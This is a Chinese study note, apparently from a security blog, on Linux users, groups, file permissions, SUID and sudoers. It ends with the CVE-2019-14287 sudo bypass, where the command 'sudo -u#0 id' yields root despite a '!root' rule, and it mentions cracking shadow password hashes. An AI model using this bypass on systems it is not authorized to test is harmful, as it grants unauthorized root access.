---
category: 网络安全
tag: 权限提升
---

# 1-Linux 权限提升

> [[Linux 安全运维\] 第三章 Linux 用户以及权限管理 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/428433013?utm_id=0)

<!-- more -->

## 1. Linux 中的用户和组

### 1.1 用户和组概念

- 超级管理员（root）
- 系统用户
- 普通用户

```text
[root@localhost ~]# id root
uid=0(root) gid=0(root) groups=0(root)
[root@localhost ~]#
```

每个用户被分配一个唯一的用户标识符（UID），用于标识和管理用户。

| 用户分类   | UID                                               |
| ---------- | ------------------------------------------------- |
| 超级管理员 | 0                                                 |
| 系统用户   | 1-499（CentOS6 及以前），1-999（CentOS7 及以后）  |
| 普通用户   | >=500（CentOS6 及以前），>=1000（CentOS7 及以后） |

GID（组标识符）用于标识和管理用户所属的组。每个用户可以属于一个或多个组，而每个组也有一个唯一的 GID。

| 用户组  | GID    |
| ------- | ------ |
| root 组 | 0      |
| 系统组  | 1-999  |
| 普通组  | >=1000 |

先有组，再有用户：

- 用户必须有且只有一个基本组。
- 当创建一个用户时，如果没有指定基本组，会先创建一个与该用户同名的组，再创建用户。
- 一个用户可以有多个附加组。
- 基本组内没有任何用户，才能被删除。

### 1.2 相关文件

`/etc/passwd` 文件中存储了所有用户信息。

![image-20240131161104043](./img/1_Linux/image-20240131161104043.png)

该文件每一行是一个用户信息，并且以`:` 为分隔符，一共 7 段内容。

```text
root:x:0:0:root:/root:/bin/bash
[--] - - - [--] [---] [--------]
 |   | | |   |    |        |
 |   | | |   |    |        +-> 7. Login shell
 |   | | |   |     +---------> 6. Home directory
 |   | | |   +---------------> 5. GECOS
 |   | | +-------------------> 4. GID
 |   | +---------------------> 3. UID
 |   +-----------------------> 2. Password
 +---------------------------> 1. Username
```

| 字段序号 | 示例      | 解释                              | 说明                                                 |
| -------- | --------- | --------------------------------- | ---------------------------------------------------- |
| 1        | root      | 用户名                            |                                                      |
| 2        | x         | 密码占位符                        | 用户的密码 x 代表有密码 无内容，用户登录系统无需密码 |
| 3        | 0         | UID                               | 当前用户的身份标识 0 就是超级管理员                  |
| 4        | 0         | GID                               | 当前用户的基本组 ID                                  |
| 5        | root      | 用户的身份信息 大名               | 现已废弃                                             |
| 6        | /root     | 用户家目录                        | 超管：/root 普通用户：/home/用户名                   |
| 7        | /bin/bash | 用户登录系统后 （默认）命令解释器 | /sbin/nologin 不允许登录系统 /bin/sh                 |

---

`/etc/shadow` 记录了系统中用户的密码信息。

![image-20240131173738484](./img/1_Linux/image-20240131173738484.png)

该文件每一行记录一个用户的密码信息，并且以`:` 作为分隔符，一共 9 段内容。

```text
root:$6$T07ge8Py$.tZXOZIOpWq2sGZKEkKn2KMahL.mcyNrQrd3C3PIqNt8kA0p/K3JtG4Dwn4vyU2kSvyEg1K2xArTs61AG1Qo1/:18766:0:99999:7:::
```

| 字段序号 | 示例      | 含义           | 说明                                                                             | 可登录 |
| -------- | --------- | -------------- | -------------------------------------------------------------------------------- | ------ |
| 1        | root      | 用户名         |                                                                                  |        |
| 2        | $6$T07ge8 | 密码密文       | sha-512 HASH 散列算法 salt 值 加密后的密文                                       |        |
| 3        | 18766     | 密码修改时间   | 距离 1970 年 1 月 1 日 密码最近一次的修改时间（天）                              |        |
| 4        | 0         | 密码最短有效期 | 在最短有效期之内不能修改密码 3：三天之内不可以修改自己的密码 root 用户不受此限制 |        |
| 5        | 99999     | 密码最长有效期 | 密码可以使用多长时间 建议设置成 90 天                                            |        |
| 6        | 7         | 密码过期时间   | 密码过期前 7 天会有警告提示                                                      |        |
| 7        |           | 密码的不活跃期 | 过了密码有效期没有修改密码， 处于不活跃期，仍然可以登录系统。                    |        |
| 8        |           | 账户失效时间   | 密码距离 1970 年 1 月 1 日的失效时间（天）                                       |        |
| 9        |           | 未分配功能     |                                                                                  |        |

密码密文结构

密码密文：

```text
$6$T07ge8Py$.tZXOZIOpWq2sGZKEkKn2KMahL.mcyNrQrd3C3PIqNt8kA0p/K3JtG4Dwn4vyU2kSvyEg1K2xArTs61AG1Qo1/

$id$salt$encrypted

$加密方式$盐值（随机的）$密码密文
```

执行命令`man crypt`可以看到加密方式分别为什么

![image-20240131174339576](./img/1_Linux/image-20240131174339576.png)

攻击者可能会先获取这个密文，然后爆破出服务器密码。

---

`/etc/group` 保存了组信息。

![image-20240131175420177](./img/1_Linux/image-20240131175420177.png)

该文件的每一行记录了每一个组的信息，并且以`:` 作为分隔符，一共 4 段内容。

```text
abcd:x:1000:
```

| 字段数 | 示例 | 含义     | 说明                                                  |
| ------ | ---- | -------- | ----------------------------------------------------- |
| 1      | abcd | 组名     | 用户组的名称，由字母或数字构成。                      |
| 2      | x    | 密码     | x 是密码标识， 组密码默认保存在 /etc/gshadow 文件中。 |
| 3      | 1000 | GID      | Group ID                                              |
| 4      | abcd | 群组用户 |                                                       |

## 2. Linux 中的权限

### 2.1 权限分类

在 Linux 中，权限被分为三个类型：读、写和执行。通过`ls -lh` 命令查看文件或目录的权限。

`ls -lh` 命令结果中，每一行以空格为分隔符分为 9 个字段（列）。

| 字段数 | 例子         | 说明                                                                      |
| ------ | ------------ | ------------------------------------------------------------------------- |
| 1      | drwxr-xr-x.  | 文件或目录权限                                                            |
| 2      | 2            | 如果文件类型是文件，表示文件的节点数 如果文件类型是目录，表示子目录的个数 |
| 3      | root         | 所有者的名字                                                              |
| 4      | root         | 所有组的名字                                                              |
| 5      | 137          | 文件大小 注意：不是目录的大小。                                           |
| 6 7 8  | Feb 23 10:25 | 文件最后一次修改时间                                                      |
| 9      | Desktop      | 文件或者目录的名字                                                        |

第一个字段中，文件或目录权限分为 5 个字段（列）。

```text
d rwx r-x r-x .
```

| 字段数 | 示例 | 含义           | 说明                                           |
| ------ | ---- | -------------- | ---------------------------------------------- |
| 1      | d    | 文件类型       | - 文件 d 目录 l 符号链接 c 字符型设备 b 块设备 |
| 2      | rwx  | 所有者权限     | u 所有者                                       |
| 3      | r-x  | 所属组的权限   | g 所属组                                       |
| 4      | r-x  | 其他用户的权限 | o 其他用户                                     |
| 5      | .    |                |                                                |

权限表达方式说明：

| 权限 | 文件           | 目录                   |
| ---- | -------------- | ---------------------- |
| r    | 读取文件内容   | 列出目录内容           |
| w    | 修改文件内容   | 创建、删除目录中的文件 |
| x    | 执行程序或脚本 | 可以进入该目录         |

### 2.2 八进制赋权法

八进制赋权法，即用八进制数表达文件或者目录的权限，这种表达方式精炼方便。

- 给读权限赋值为 4，即`r = 4`；
- 写权限赋值为 2，即`w = 2`；
- 执行权限赋值为 1，即`x = 1`。

| 权限位 | 2 进制 | 8 进制 |
| ------ | ------ | ------ |
| ---    | 000    | 0      |
| --x    | 001    | 1      |
| -w-    | 010    | 2      |
| -wx    | 011    | 3      |
| r--    | 100    | 4      |
| r-x    | 101    | 5      |
| rw-    | 110    | 6      |
| rwx    | 111    | 7      |

常见权限：

- 777，最高权限；
- 755，可执行文件；
- 644，文档文件。

### 2.3 权限修改

- 对文件或目录进行权限设置，一定程度上保证安全性。
- 只有文件或者目录的所有者才能赋权，root 除外。
- 一般情况下，通过 chmod 命令进行权限修改或调整。

chmod 命令有固定的使用格式，如下：

```text
chmod 对象 运算符号 权限 文件或者目录
```

例如

```
chmod u+w ./aaa.txt
```

权限运算说明：

| 对象                                           | 运算符号                                           | 权限                             |
| ---------------------------------------------- | -------------------------------------------------- | -------------------------------- |
| u g o a<br />u 所有者、g 所属组、o 其他、a all | + - =<br />\+ 增加权限、- 取消权限、= 唯一设定权限 | r w x t s<br />t 和 s 权限在后面 |

可以通过 chown 命令，修改文件所有者，命令格式如下：

```text
chown 修改后的所属者 目标文件或者目录
```

常用命令选项：

- -R，递归修改

### 2.4 特殊权限

![img](./img/1_Linux/1568045-20190420014404372-1216036035.png)

**粘滞位对目录有效**

- 用字符表示：t
- 用八进制表示：1000

`/tmp`目录就是使用了粘滞位 t，其作用是，在该目录下创建文件或目录后，仅允许其作者（所有者）进行删除操作。其他用户无法删除。

![image-20240206170415976](./img/1_Linux/image-20240206170415976.png)

**特殊权限位 SUID，对可执行文件有效**

- 用字符表示：s
- 用八进制表示：4000

Setuid 最常用的是配合执行权限 x 使用，例如，系统中内置命令 passwd，它默认是带有 s 权限位，passwd 命令的主要功能是修改用户的密码，而修改密码的流程是：

1. 将加密后的哈希值写入到`/etc/passwd`文件对应的用户条目中。
2. 使用 pwconv 工具转换到`/etc/shadow`文件中。
3. 而普通用户是没有权限修改`/etc/passwd` 和 `/etc/shadow`文件

在普通用户尝试执行 passwd，该 passwd 的所有者是 root 并且设置了 Suid，因此 passwd 以 root 身份执行。

**特殊权限位 SGID，对目录有效**

- 用字符表示：s
- 用八进制表示：2000

当一个目录拥有 sgid 权限时，其他用户在该目录下创建文件或目录后，它会继承目录的 id，即创建的文件或目录的属组为父目录的属组。

**注意**

- root 无视权限标识。
- 目录的权限中的添加、删除、列出目录内容有进入权限的前提才可以。
- 权限从左向右匹配。

## 3. sudo 权限控制

**sudo 的作用**

Linux 是多用户多任务的分时操作系统，共享该系统的用户往往不只一个。考虑到 root 账户密码的敏感性和 root 账号的无限制权限，有必要采取如下措施：

- 通过 useradd 创建一些普通用户，只让他们拥有不完全的权限。
- 在必须使用 root 用户执行命令的情况下，需要申请 root 权限。

### sudoers

一般情况下，使用 sudo 都是在申请 root 用户身份特权执行某一个命令，要求输入密码时，输入的是当前用户密码。

具体某一个用户可以以哪一个用户身份执行某一个命令，是需要配置的。

配置文件`/etc/sudoers `是`sudo`命令的配置文件。

典型配置文件格式：

```text
[root@localhost ~]# grep -n "^root" /etc/sudoers
92:root ALL=(ALL)   ALL
[root@localhost ~]#
```

配置文件 sudoers 关于权限的配置，大概分为 5 个字段，具体含义如下：

| 示例      | 字段 | 含义                                           |
| --------- | ---- | ---------------------------------------------- |
| root      | 1    | 授权用户\| 组                                  |
| ALL       | 2    | 主机                                           |
| (ALL:ALL) | 3    | 用户:组 授权用户可以以此用户身份特权执行命令。 |
| NOPASSWD: | 4    | 是否需要输入密码验证                           |
| ALL       | 5    | 命令 1，命令 2，...                            |

配置示例，用户 ajest 可以以登录在任何地址的任何用户身份特权执行 whoami 和 id 命令，并且没有密码保护。

```text
[root@localhost ~]# grep -n "^abcd" /etc/sudoers
1:abcd ALL=(ALL:ALL) NOPASSWD: /usr/bin/whoami, /usr/bin/id
[root@localhost ~]#
```

输入 sudo -l 可以看到

### CVE-2019-14287

版本号 < 1.8.28 的 Sudo 版本均将受到该漏洞的影响。

```shell
sudo -V
Sudo version 1.8.23
Sudoers policy plugin version 1.8.23
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.23
```

配置如果为这样

```
[abcd@localhost tmp]$ sudo -l

User abcd may run the following commands on localhost:
    (ALL, !root) /usr/bin/id

```

效果

```
[abcd@localhost tmp]$ sudo -u#0 id
uid=0(root) gid=0(root) groups=0(root),980(wireshark)
```
